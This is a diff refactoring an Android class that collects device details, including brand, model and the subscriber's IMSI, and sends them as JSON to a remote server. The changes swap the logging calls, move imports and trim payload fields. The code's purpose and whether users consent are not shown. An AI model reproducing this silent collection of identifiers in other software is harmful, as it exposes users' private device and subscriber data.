@@ -1,7 +1,6 @@
 package com.inet.android.info;
 
 import java.lang.reflect.Method;
-import java.util.List;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -14,13 +13,10 @@ import android.net.ConnectivityManager;
 import android.preference.PreferenceManager;
 import android.telephony.TelephonyManager;
 import android.util.DisplayMetrics;
-import android.util.Log;
 import android.view.WindowManager;
 
-import com.inet.android.convertdate.ConvertDate;
-import com.inet.android.db.RequestDataBaseHelper;
-import com.inet.android.db.RequestWithDataBase;
 import com.inet.android.request.DataRequest;
+import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 
 public class GetInfo {
@@ -36,7 +32,7 @@ public class GetInfo {
 
 	public GetInfo(Context mContext) {
 		GetInfo.mContext = mContext;
-		Log.d("Getinfo", "context");
+		Logging.doLog(LOG_TAG, "context");
 	}
 
 	public void getInfo() {
@@ -68,11 +64,7 @@ public class GetInfo {
 		JSONObject info = new JSONObject();
 		JSONObject object = new JSONObject();
 		try {
-			jsonObject.put("account", sp.getString("account", "0000"));
-			jsonObject.put("device", sp.getString("device", "device"));
-			jsonObject.put("imei", sp.getString("imei", "0000"));
-			jsonObject.put("key", System.currentTimeMillis());
-
+		
 			info.put("brand", getBrand());
 			info.put("model", getModel());
 			info.put("imsi", getIMSI());
@@ -100,7 +92,7 @@ public class GetInfo {
 			object.put("info", info);
 			data.put(object);
 			jsonObject.put("data", data);
-			sendJSONStr = jsonObject.toString();
+			sendJSONStr = data.toString();
 		} catch (JSONException e) {
 			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
 		}
@@ -109,13 +101,7 @@ public class GetInfo {
 			dr.sendRequest(sendJSONStr);
 			Logging.doLog(LOG_TAG, sendJSONStr);
 		}
-		// e = sp.edit();
-		// e.putString("BUILD", "A0003 2013-10-03 20:00:00");
-		// e.putString("IMEI", sIMEI);
-		// // e.putString("ABOUT", aboutDev);
-		// e.commit();
-
-	}
+			}
 
 	/**
 	 * get getSimOperatorName
